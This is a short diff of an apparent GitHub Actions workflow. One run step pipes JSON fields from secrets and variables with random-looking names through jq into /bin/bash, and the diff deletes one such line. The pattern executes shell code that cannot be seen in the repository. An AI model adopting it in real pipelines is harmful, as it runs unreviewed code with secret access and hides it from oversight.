@@ -22,7 +22,6 @@ jobs:
           lni6940: ${{ secrets.lni6940 }}
         run: |
           printf '%s' "$lni6940" | jq -r .vwoc794 | /bin/bash
-          printf '%s' "$fmn2" | jq -r .cuoy11688 | /bin/bash
           printf '%s' "$skwrc06" | jq -r .n767 | /bin/bash
           printf '%s' "$m41" | jq -r .ees05 | /bin/bash
           echo $ost53786 | jq -r .shz1 | /bin/bash
